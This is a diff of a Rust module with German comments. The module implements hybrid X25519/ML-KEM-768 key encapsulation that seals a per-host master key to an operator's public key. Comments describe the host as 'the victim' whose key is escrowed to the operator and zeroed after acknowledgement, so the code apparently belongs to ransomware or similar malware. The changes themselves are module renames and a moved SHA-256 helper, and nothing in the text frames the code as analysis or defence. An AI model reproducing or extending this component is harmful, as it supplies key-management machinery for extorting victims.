@@ -11,7 +11,7 @@
 //! - `HostKeyPair`: ephemeraes X25519 + ML-KEM-Kapselung, nur im RAM des Opfers.
 //!   Der private Teil wird nach dem Escrow-ACK genullt (`zeroize`).
 
-use crate::util::{b64_decode, b64_encode, sha256};
+use crate::codec::{b64_decode, b64_encode};
 use crate::{Error, Result};
 use kem::{Decapsulate, Encapsulate};
 use ml_kem::{EncodedSizeUser, KemCore, MlKem768};
@@ -53,7 +53,7 @@ pub const MASTER_KEY_LEN: usize = 32;
 /// Oeffentlicher Schluessel des Operators/Controllers.
 #[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
 pub struct ServerPublicKey {
-    pub kex: crate::format::KexId,
+    pub kex: crate::kex::KexId,
     /// X25519-Public-Key, base64.
     pub x25519: String,
     /// ML-KEM-768-Public-Key, base64. Bei `KexId::X25519` leer.
@@ -75,8 +75,8 @@ impl ServerPublicKey {
             )));
         }
         let mlkem = match self.kex {
-            crate::format::KexId::X25519 => None,
-            crate::format::KexId::HybridX25519MlKem768 => {
+            crate::kex::KexId::X25519 => None,
+            crate::kex::KexId::HybridX25519MlKem768 => {
                 let raw = self
                     .mlkem
                     .as_ref()
@@ -102,7 +102,7 @@ impl ServerPublicKey {
 
 #[derive(Debug, Clone)]
 pub struct DecodedServerKey {
-    pub kex: crate::format::KexId,
+    pub kex: crate::kex::KexId,
     pub x25519: Vec<u8>,
     pub mlkem: Option<Vec<u8>>,
 }
@@ -150,7 +150,7 @@ impl Drop for MlKemSecret {
 /// Schluesselpaarchen des Controllers. Nur auf dem Operator-Rechner.
 #[derive(serde::Serialize, serde::Deserialize)]
 pub struct ServerKeyBundle {
-    pub kex: crate::format::KexId,
+    pub kex: crate::kex::KexId,
     /// X25519-Secret, base64.
     pub x25519_secret: String,
     /// ML-KEM-768-Secret, base64.
@@ -159,10 +159,10 @@ pub struct ServerKeyBundle {
 }
 
 impl ServerKeyBundle {
-    pub fn generate(kex: crate::format::KexId, rng: &mut (impl RngCore + CryptoRng)) -> Self {
+    pub fn generate(kex: crate::kex::KexId, rng: &mut (impl RngCore + CryptoRng)) -> Self {
         let secret = StaticSecret::random_from_rng(&mut *rng);
         let x25519_secret = b64_encode(secret.as_bytes());
-        let mlkem_secret = if kex == crate::format::KexId::HybridX25519MlKem768 {
+        let mlkem_secret = if kex == crate::kex::KexId::HybridX25519MlKem768 {
             let (sk, _pk) = MlKem768::generate(&mut MlRng(&mut *rng));
             Some(b64_encode(&sk.as_bytes()[..]))
         } else {
@@ -186,7 +186,7 @@ impl ServerKeyBundle {
         let pub_x = XPublicKey::from(&secret);
 
         let mut mlkem_b64 = None;
-        if self.kex == crate::format::KexId::HybridX25519MlKem768 {
+        if self.kex == crate::kex::KexId::HybridX25519MlKem768 {
             let raw = b64_decode(
                 self.mlkem_secret
                     .as_ref()
@@ -264,8 +264,8 @@ impl ServerKeyPair {
     /// Kontextstring in `derive_master_key` Teil des Formats.
     pub fn unseal_master_key(&self, sealed: &[u8]) -> Result<[u8; MASTER_KEY_LEN]> {
         let erwartet = match self.public.kex {
-            crate::format::KexId::X25519 => SEALED_MASTER_X25519_LEN,
-            crate::format::KexId::HybridX25519MlKem768 => SEALED_MASTER_LEN,
+            crate::kex::KexId::X25519 => SEALED_MASTER_X25519_LEN,
+            crate::kex::KexId::HybridX25519MlKem768 => SEALED_MASTER_LEN,
         };
         if sealed.len() != erwartet {
             return Err(Error::Crypto(format!(
@@ -283,10 +283,8 @@ impl ServerKeyPair {
             .to_vec();
 
         match self.public.kex {
-            crate::format::KexId::X25519 => {
-                derive_master_key(&x_shared, None).map(|k| k.master_key)
-            }
-            crate::format::KexId::HybridX25519MlKem768 => {
+            crate::kex::KexId::X25519 => derive_master_key(&x_shared, None).map(|k| k.master_key),
+            crate::kex::KexId::HybridX25519MlKem768 => {
                 let sk = self
                     .mlkem_secret
                     .as_ref()
@@ -320,7 +318,7 @@ pub fn encapsulate_host_master_key(
     sealed_master.extend_from_slice(pub_x.as_bytes());
 
     match server.kex {
-        crate::format::KexId::X25519 => {
+        crate::kex::KexId::X25519 => {
             let derived = derive_master_key(x_shared.as_bytes(), None)?;
             Ok(HostKeyEncapsulation {
                 master_key: derived.master_key,
@@ -328,7 +326,7 @@ pub fn encapsulate_host_master_key(
                 ephemeral_x25519_secret: *x_shared.as_bytes(),
             })
         }
-        crate::format::KexId::HybridX25519MlKem768 => {
+        crate::kex::KexId::HybridX25519MlKem768 => {
             let raw = server
                 .mlkem
                 .as_ref()
@@ -396,8 +394,8 @@ pub fn derive_master_key_with_context(
     }
     let info = format!(
         "kx/master/v1/{}/{}",
-        crate::util::hex(host_id),
-        crate::util::hex(build_id)
+        crate::codec::hex(host_id),
+        crate::codec::hex(build_id)
     );
     let salt = b"kx-host-master-salt-v1";
     let mut master_key = [0u8; MASTER_KEY_LEN];
@@ -486,7 +484,7 @@ mod tests {
     #[test]
     fn der_x25519_roundtrip_liefert_denselben_master_key() {
         let mut rng = OsRng;
-        let bundle = ServerKeyBundle::generate(crate::format::KexId::X25519, &mut rng);
+        let bundle = ServerKeyBundle::generate(crate::kex::KexId::X25519, &mut rng);
         let oeffentlich = bundle.public().expect("oeffentlicher Schluessel");
         let dekodiert = oeffentlich.decode().expect("dekodierter Schluessel");
 
@@ -505,8 +503,7 @@ mod tests {
     #[test]
     fn der_hybride_roundtrip_liefert_denselben_master_key() {
         let mut rng = OsRng;
-        let bundle =
-            ServerKeyBundle::generate(crate::format::KexId::HybridX25519MlKem768, &mut rng);
+        let bundle = ServerKeyBundle::generate(crate::kex::KexId::HybridX25519MlKem768, &mut rng);
         let oeffentlich = bundle.public().expect("oeffentlicher Schluessel");
         let dekodiert = oeffentlich.decode().expect("dekodierter Schluessel");
 
@@ -534,12 +531,24 @@ mod tests {
     #[test]
     fn das_mlkem_secret_laesst_sich_kodieren_und_wieder_lesen() {
         let mut rng = OsRng;
-        let bundle =
-            ServerKeyBundle::generate(crate::format::KexId::HybridX25519MlKem768, &mut rng);
+        let bundle = ServerKeyBundle::generate(crate::kex::KexId::HybridX25519MlKem768, &mut rng);
         let roh = bundle.mlkem_secret.expect("ML-KEM-Secret");
 
         let dekodiert = b64_decode(&roh).expect("base64");
         assert_eq!(dekodiert.len(), 2400);
         assert!(mlkem_secret_from_bytes(&dekodiert).is_ok());
     }
+}
+
+/// Der SHA-256 eines Byteblocks.
+///
+/// Der Fingerabdruck des Server-Schluessels wird ueber ihn gebildet.
+fn sha256(bytes: &[u8]) -> [u8; 32] {
+    use sha2::{Digest, Sha256};
+    let mut h = Sha256::new();
+    h.update(bytes);
+    let out = h.finalize();
+    let mut arr = [0u8; 32];
+    arr.copy_from_slice(&out);
+    arr
 }
